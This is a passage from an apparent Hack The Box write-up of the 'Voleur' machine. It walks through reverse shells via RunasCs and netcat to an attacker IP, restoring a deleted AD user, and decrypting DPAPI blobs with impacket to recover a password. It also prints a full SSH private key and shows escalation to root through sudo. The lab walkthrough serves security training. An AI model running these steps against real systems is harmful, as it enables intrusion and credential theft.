┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.35] from (UNKNOWN) [10.129.197.35] 63972
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Enumeration (SVC_LDAP)

Once more a quick check on the privileges but as nearly always without anything special.

```cmd
C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name       SID                                           
=============== ==============================================
voleur\svc_ldap S-1-5-21-3927696377-1337352550-2781715495-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes                                        
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
VOLEUR\Restore_Users                       Group            S-1-5-21-3927696377-1337352550-2781715495-1602 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## Privilege Escalation to Todd.Wolfe

### Active Directory Tombstones

Now it was time to see if we actually could `restore` the `deleted user` of `todd.wolfe` by using `Active Directory Tombstones`.

First of all we needed `PowerShell`.

```cmd
C:\Windows\system32>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32>
```

And indeed we found the deleted object and were able to restore it.

```cmd
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

```cmd
PS C:\Windows\system32> Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
```

Luckily for us the `password` we found in the `Excel Document` was still working and so we could repeat the step executing `RunasCs` to get a session as `todd.wolfe`.

```cmd
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe Todd.Wolfe NightT1meP1dg3on14 cmd.exe -r 10.10.16.35:8888
[*] Warning: The logon for user 'Todd.Wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-30256c$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 6200 created in background.
```

```shell
┌──(kali㉿kali)-[/mnt]
└─$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.10.16.35] from (UNKNOWN) [10.129.197.35] 62160
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Enumeration (Todd.Wolfe)

At this point we already knew that the user was member of the `Second-Line Support` team which had access to the equally named `SMB Share`. The share contained a folder called `Archived Users` which seemed pretty interesting to us.

```shell
C:\IT\Second-Line Support>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A5C3-6454

 Directory of C:\IT\Second-Line Support

01/29/2025  08:13 AM    <DIR>          .
01/29/2025  02:10 AM    <DIR>          ..
01/29/2025  08:13 AM    <DIR>          Archived Users
               0 File(s)              0 bytes
               3 Dir(s)   3,654,823,936 bytes free
```

## Privilege Escalation to jeremy.combs
### Data Protection API (DPAPI)

Our basic idea was to check for `Data Blobs` of the `Data Protection API (DPAPI)` within the `Archived Users` folder to eventually carve out some nice credentials.

- [https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary](https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary)

```cmd
PS C:\temp> $targetPaths = @(
    "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect",
    "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials",
    "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Local\Microsoft\Credentials",
    "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Local\Microsoft\Vault"
)

foreach ($path in $targetPaths) {
    Get-ChildItem -Path $path -Recurse -Force -File -ErrorAction SilentlyContinue |
        Select-Object FullName, Length, Attributes
}
$targetPaths = @(
>>     "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect",
>>     "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials",
>>     "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Local\Microsoft\Credentials",
>>     "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Local\Microsoft\Vault"
>> )
>> 
PS C:\temp> foreach ($path in $targetPaths) {
>>     Get-ChildItem -Path $path -Recurse -Force -File -ErrorAction SilentlyContinue |
>>         Select-Object FullName, Length, Attributes
>> }
>> 


FullName                                                                                                               
--------                                                                                                               
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\CREDHIST                         
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\SYNCHIST                         
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550...
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550...
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550...
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B003...
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859...
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB...
```

We found the required `SID (S-1-5-21-3927696377-1337352550-2781715495-1110)` as well as the `credentials file (08949382-134f-4c63-b93c-ce52efc0aa88)`.

```cmd
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> dir
dir


    Directory: C:\IT\Second-Line Support\Archived 
    Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:53 AM            740 08949382-134f-4c63-b93c-ce52efc0aa88
```

Next we searched for the `Data Blob (772275FAD58525253490A9B0039791D3)`.

```cmd
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials> dir
dir


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3
```

We created a directory on `C:\` called `temp` to easy deal with files and folders and moved our findings to this location.

```cmd
PS C:\temp> copy "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88" 08949382-134f-4c63-b93c-ce52efc0aa88
```

```cmd
PS C:\temp> copy "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3" 772275FAD58525253490A9B0039791D3
```

Then we downloaded them by using our initial `session` on `Evil-WinRM`.

```cmd
*Evil-WinRM* PS C:\temp> download 08949382-134f-4c63-b93c-ce52efc0aa88
                                        
Info: Downloading C:\temp\08949382-134f-4c63-b93c-ce52efc0aa88 to 08949382-134f-4c63-b93c-ce52efc0aa88
                                        
Info: Download successful!
```

```cmd
*Evil-WinRM* PS C:\temp> download 772275FAD58525253490A9B0039791D3
                                        
Info: Downloading C:\temp\772275FAD58525253490A9B0039791D3 to 772275FAD58525253490A9B0039791D3
                                        
Info: Download successful!
```

Then we finally could follow the article by `Synacktiv` by starting with the search for the `Masterkey`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88                                                                                                                                     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

[MASTERKEY]
Version     :        2 (2)
Salt        : b'48059cadeb79bc7cf66450c91ab9d923'
Rounds      :     4650 (18000)
HashAlgo    : 00008009 (32777) (CALG_HMAC)
CryptAlgo   : 00006603 (26115) (CALG_3DES)
data        : b'035c8f507f8f295484d7127be5226d24be07bfdb7621ca83f7d8483e9c89ba6568c777638cec8caaac55329c36d2e571d1541ead43b8536cdd12163fe6e6c1e32e0d4f1cb9f226a1e2d3950a4861d321f96f603e6125f0ae2e13b690137630e577004e5c72b6b988'

[MASTERKEY]
Version     :        2 (2)
Salt        : b'1eef9c154f95634b6f180402d64d11fe'
Rounds      :     4650 (18000)
HashAlgo    : 00008009 (32777) (CALG_HMAC)
CryptAlgo   : 00006603 (26115) (CALG_3DES)
data        : b'4ad4e3a9bb72ac854af774b35d718f32529d3f402bd6f51c800dd6bc24469ffded906e7f179d0b903dbffb2c436f7845d23b84760ecc572d70ace1b6a7d496b38a7082aa4beb596d'

[DOMAINKEY]
Version       :        2 (2)
Guid          : 983A8B84-CAC9-4E3F-AB10-DEB81FEE2F43
SecretLen     :      100 (256)
AccessCheckLen: 00000058 (88)
SecretData    : b'48e68456738d5f8290406e69f651655b4fe5b754e78f4768ee4505d6bb541401cb2422e136c529291972aae41248cd059da20fa000815d601443c3f528b7d5a2c5c61c7e73c7d0703fc4be4a382e0cbde2a4c3535a04db031ccc07ac1e8b4d82fc68d6e134ea673e9dfc435f262efd42ec29e3c9e9e319ad0ce30a7cd04a74f19d1c8052789049f744a904dfec147a2f7a0b91a5f1a67095691383ffdb26561dc1d29535f1c756c5d8647f377d9e2d5ce50d6f14d238aa657cfe180c593c9717559cdcc090a743ce9be5657d601ad7ab777983218f196831ddcaf264f311fb4dc242d4f8d65c4de027e07c3e7d72b6e6379b0c642a7a286e51c91b3727593405'
AccessCheck   : b'7c0bcbc462df75b06213940828bda528f5cb7befc2a980578bf5532747d0f5cf947fb7f5eda8076e3ced44c619d97269082cd185bb1f9816cdcf7666b7132b54d704eea59fb99e06f9a44f546ea846471d3a5f5a8289147b'

Cannot decrypt (specify -key or -sid whenever applicable)
```

We needed the `SID (S-1-5-21-3927696377-1337352550-2781715495-1110)` as well as the `password (NightT1meP1dg3on14)` and of course the `file (08949382-134f-4c63-b93c-ce52efc0aa88)` to `decrypt` the `Masterkey (0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83)`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password NightT1meP1dg3on14 -sid S-1-5-21-3927696377-1337352550-2781715495-1110
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

With the `Masterkey (0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83)` we now were able to access the `stored credentials` for `jeremy.combs` inside the `Data Blob (772275FAD58525253490A9B0039791D3)`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

| Username     | Password       |
| ------------ | -------------- |
| jeremy.combs | qT3V9pLXyN7W4m |

Once more `RunasCs*ing` and we `escalated` our `privileges` even further to `jeremy.combs`.

```cmd
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe jeremy.combs qT3V9pLXyN7W4m cmd.exe -r 10.10.16.35:7878
[*] Warning: The logon for user 'jeremy.combs' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-30256c$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1892 created in background.
```

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 7878
listening on [any] 7878 ...
connect to [10.10.16.35] from (UNKNOWN) [10.129.197.35] 61257
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Enumeration (jeremy.combs)

The user `jeremy.combs` now could access the `Third-Line Support` folder inside the `SMB Share` and granted us access to a `SSH Private Key (id_rsa)` as well to an interesting `note` called `Note.txt.txt`.

```shell
C:\IT\Third-Line Support>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A5C3-6454

 Directory of C:\IT\Third-Line Support

01/30/2025  09:11 AM    <DIR>          .
01/29/2025  02:10 AM    <DIR>          ..
01/30/2025  09:11 AM    <DIR>          Backups
01/30/2025  09:10 AM             2,602 id_rsa
01/30/2025  09:07 AM               186 Note.txt.txt
               2 File(s)          2,788 bytes
               3 Dir(s)   3,644,235,776 bytes free
```

```shell
C:\IT\Third-Line Support>type id_rsa
type id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

At this point we finally got an answer to the port `2222/TCP` at the beginning of the box.

```shell
C:\IT\Third-Line Support>type Note.txt.txt
type Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

## Privilege Escalation to svc_backup

We copied the `SSH Private Key` to our local machine and gave it the proper permissions of `600` in order to use it for `authentication`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqFyPMvURW/qbyRlemAMzaPVvfR7JNHznL6xDHP4o/hqWIzn3dZ66
P2absMgZy2XXGf2pO0M13UidiBaF3dLNL7Y1SeS/DMisE411zHx6AQMepj0MGBi/c1Ufi7
rVMq+X6NJnb2v5pCzpoyobONWorBXMKV9DnbQumWxYXKQyr6vgSrLd3JBW6TNZa3PWThy9
wrTROegdYaqCjzk3Pscct66PhmQPyWkeVbIGZAqEC/edfONzmZjMbn7duJwIL5c68MMuCi
9u91MA5FAignNtgvvYVhq/pLkhcKkh1eiR01TyUmeHVJhBQLwVzcHNdVk+GO+NzhyROqux
haaVjcO8L3KMPYNUZl/c4ov80IG04hAvAQIGyNvAPuEXGnLEiKRcNg+mvI6/sLIcU5oQkP
JM7XFlejSKHfgJcP1W3MMDAYKpkAuZTJwSP9ISVVlj4R/lfW18tKiiXuygOGudm3AbY65C
lOwP+sY7+rXOTA2nJ3qE0J8gGEiS8DFzPOF80OLrAAAFiIygOJSMoDiUAAAAB3NzaC1yc2
EAAAGBAKhcjzL1EVv6m8kZXpgDM2j1b30eyTR85y+sQxz+KP4aliM593Weuj9mm7DIGctl
1xn9qTtDNd1InYgWhd3SzS+2NUnkvwzIrBONdcx8egEDHqY9DBgYv3NVH4u61TKvl+jSZ2
9r+aQs6aMqGzjVqKwVzClfQ520LplsWFykMq+r4Eqy3dyQVukzWWtz1k4cvcK00TnoHWGq
go85Nz7HHLeuj4ZkD8lpHlWyBmQKhAv3nXzjc5mYzG5+3bicCC+XOvDDLgovbvdTAORQIo
JzbYL72FYav6S5IXCpIdXokdNU8lJnh1SYQUC8Fc3BzXVZPhjvjc4ckTqrsYWmlY3DvC9y
jD2DVGZf3OKL/NCBtOIQLwECBsjbwD7hFxpyxIikXDYPpryOv7CyHFOaEJDyTO1xZXo0ih
34CXD9VtzDAwGCqZALmUycEj/SElVZY+Ef5X1tfLSool7soDhrnZtwG2OuQpTsD/rGO/q1
zkwNpyd6hNCfIBhIkvAxczzhfNDi6wAAAAMBAAEAAAGBAIrVgPSZaI47s5l6hSm/gfZsZl
p8N5lD4nTKjbFr2SvpiqNT2r8wfA9qMrrt12+F9IInThVjkBiBF/6v7AYHHlLY40qjCfSl
ylh5T4mnoAgTpYOaVc3NIpsdt9zG3aZlbFR+pPMZzAvZSXTWdQpCDkyR0QDQ4PY8Li0wTh
FfCbkZd+TBaPjIQhMd2AAmzrMtOkJET0B8KzZtoCoxGWB4WzMRDKPbAbWqLGyoWGLI1Sj1
MPZareocOYBot7fTW2C7SHXtPFP9+kagVskAvaiy5Rmv2qRfu9Lcj2TfCVXdXbYyxTwoJF
ioxGl+PfiieZ6F8v4ftWDwfC+Pw2sD8ICK/yrnreGFNxdPymck+S8wPmxjWC/p0GEhilK7
wkr17GgC30VyLnOuzbpq1tDKrCf8VA4aZYBIh3wPfWFEqhlCvmr4sAZI7B+7eBA9jTLyxq
3IQpexpU8BSz8CAzyvhpxkyPXsnJtUQ8OWph1ltb9aJCaxWmc1r3h6B4VMjGILMdI/KQAA
AMASKeZiz81mJvrf2C5QgURU4KklHfgkSI4p8NTyj0WGAOEqPeAbdvj8wjksfrMC004Mfa
b/J+gba1MVc7v8RBtKHWjcFe1qSNSW2XqkQwxKb50QD17TlZUaOJF2ZSJi/xwDzX+VX9r+
vfaTqmk6rQJl+c3sh+nITKBN0u7Fr/ur0/FQYQASJaCGQZvdbw8Fup4BGPtxqFKETDKC09
41/zTd5viNX38LVig6SXhTYDDL3eyT5DE6SwSKleTPF+GsJLgAAADBANMs31CMRrE1ECBZ
sP+4rqgJ/GQn4ID8XIOG2zti2pVJ0dx7I9nzp7NFSrE80Rv8vH8Ox36th/X0jme1AC7jtR
B+3NLjpnGA5AqcPklI/lp6kSzEigvBl4nOz07fj3KchOGCRP3kpC5fHqXe24m3k2k9Sr+E
a29s98/18SfcbIOHWS4AUpHCNiNskDHXewjRJxEoE/CjuNnrVIjzWDTwTbzqQV+FOKOXoV
B9NzMi0MiCLy/HJ4dwwtce3sssxUk7pQAAAMEAzBk3mSKy7UWuhHExrsL/jzqxd7bVmLXU
EEju52GNEQL1TW4UZXVtwhHYrb0Vnu0AE+r/16o0gKScaa+lrEeQqzIARVflt7ZpJdpl3Z
fosiR4pvDHtzbqPVbixqSP14oKRSeswpN1Q50OnD11tpIbesjH4ZVEXv7VY9/Z8VcooQLW
GSgUcaD+U9Ik13vlNrrZYs9uJz3aphY6Jo23+7nge3Ui7ADEvnD3PAtzclU3xMFyX9Gf+9
RveMEYlXZqvJ9PAAAADXN2Y19iYWNrdXBAREMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ chmod 600 id_rsa
```

First we tried to authenticate as `jeremy.combs` which failed before we tried the user `SVC_BACKUP` and got a shell.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ ssh -p 2222 -i id_rsa svc_backup@10.129.197.35
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul  5 23:22:01 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   40%       IPv4 address for eth0: 10.129.197.35
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                                                                                                         [ OK ] 
svc_backup@DC:~$
```

## Enumeration (svc_backup)

Quick look at the `group permissions` and `home folder` didn't showed anything useful besides the fact that the user was member of the `sudo` group.

```shell
svc_backup@DC:~$ id
uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
```

```shell
svc_backup@DC:~$ ls -la
total 8
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30 06:27 .
drwxr-xr-x 1 root       root       4096 Jan 30 03:46 ..
-rw-r--r-- 1 svc_backup svc_backup  220 Jan 30 03:46 .bash_logout
-rw-r--r-- 1 svc_backup svc_backup 3837 Jan 30 06:26 .bashrc
drwx------ 1 svc_backup svc_backup 4096 Jan 30 04:18 .cache
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30 03:46 .landscape
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30 04:27 .local
-rw-r--r-- 1 svc_backup svc_backup    0 Jul  5 20:02 .motd_shown
-rw-r--r-- 1 svc_backup svc_backup  807 Jan 30 03:46 .profile
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30 04:16 .ssh
-rw-r--r-- 1 svc_backup svc_backup    0 Jan 30 04:02 .sudo_as_admin_successful
```

So we `escalated` our `privileged` to `root` real quick and checked the mounted drives because the note earlier told us something about making `backups` in `Windows Subsystem for Linux (WSL)`.

```shell
svc_backup@DC:~$ sudo su
root@DC:/home/svc_backup#
```

As expected the whole `C-Drive` was mounted within `/mnt/c` which we started investigating.

```shell
root@DC:/home/svc_backup# mount
rootfs on / type wslfs (rw,noatime)
none on /dev type tmpfs (rw,noatime,mode=755)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,noatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,noatime)
devpts on /dev/pts type devpts (rw,nosuid,noexec,noatime,gid=5,mode=620)
none on /run type tmpfs (rw,nosuid,noexec,noatime,mode=755)
none on /run/lock type tmpfs (rw,nosuid,nodev,noexec,noatime)
none on /run/shm type tmpfs (rw,nosuid,nodev,noatime)
